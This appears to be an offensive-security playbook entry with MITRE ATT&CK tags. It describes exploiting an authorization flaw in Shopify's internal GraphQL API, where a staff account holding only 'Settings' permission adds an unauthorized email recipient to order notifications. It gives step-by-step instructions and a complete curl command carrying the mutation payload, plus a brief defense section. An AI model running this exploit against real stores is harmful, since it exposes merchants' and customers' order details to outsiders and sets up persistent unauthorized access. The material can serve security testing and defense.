---
tags:
  - shopify
  - graphql
  - mutation
  - authorization-bypass
type: procedure
tools: []
tactics:
  - '[[Persistence]]'
commands:
  - '[[commands/curl-graphql-mutation]]'
verified: false
platforms:
  - Web
  - Shopify
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Additional Cloud Credentials]]'
updated_at: '2025-12-14T17:29:29.001Z'
sub_techniques: []
id: 8be03040-9cdb-4e1f-bf42-e5833ed1db67
validated: true
mitre_tactics:
  - '[[Persistence]]'
mitre_techniques:
  - '[[Additional Cloud Credentials]]'
---
# Execute staffOrderNotificationSubscriptionCreate Mutation

## Summary

This procedure exploits an improper authorization vulnerability in Shopify's GraphQL API by executing the 'staffOrderNotificationSubscriptionCreate' mutation with a low-privilege staff account, adding an unauthorized email to order notifications despite access denial.

## Description

The Shopify GraphQL API endpoint '/admin/internal/web/graphql/core?operation=SwitcherNoStores' performs frontend authorization checks that fail and return 'Access denied', but the backend mutation executes anyway. This allows staff with only 'Settings' permission to modify notification settings, potentially leading to disclosure of order details via email. Prerequisites include an authenticated session from a 'Settings'-only account.

## Requirements

1. Authenticated session with 'Settings' permission only
2. HTTP client like curl for POST requests
3. Target Shopify subdomain and desired email recipient

## Defense

Defensive measures and detection strategies:

- Enforce consistent backend authorization matching frontend checks
- Log and alert on GraphQL mutations from low-privilege accounts
- Audit notification settings changes and restrict email additions to high-privilege roles

## Objectives

1. Bypass authorization to create notification subscription
2. Add unauthorized email recipient for order notifications
3. Demonstrate integrity violation in settings modification

## Instructions

### Step 1: Prepare Mutation Payload

**Context**: Construct the GraphQL mutation query to add an email recipient.

The payload specifies the email and type as EMAIL.

### Step 2: Send POST Request

**Context**: Execute the mutation using [[commands/curl-graphql-mutation]] to the GraphQL endpoint, including the session token.

**Command** ([[commands/curl-graphql-mutation]]):
```bash
curl -X POST 'https://yoursubdomain.myshopify.com/admin/internal/web/graphql/core?operation=SwitcherNoStores' \
  -H 'Content-Type: application/json' \
  -H 'X-Shopify-Access-Token: YOUR_SESSION_TOKEN' \
  -d '{"query": "mutation{staffOrderNotificationSubscriptionCreate(notificationRecipientIdentifier:\"testingforshopify@ngailong.com\",notificationRecipientType:EMAIL){staffOrderNotificationSubscription{id}}}"}'
```

> The response will include an access denied error, but the subscription is created in the backend, affecting notification settings.

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence]]

### Techniques

- [[Additional Cloud Credentials]]

### Sub-Techniques


## Commands Used

- [[commands/curl-graphql-mutation]]

## Tools Used


## Tags

- shopify
- graphql
- mutation
- authorization-bypass
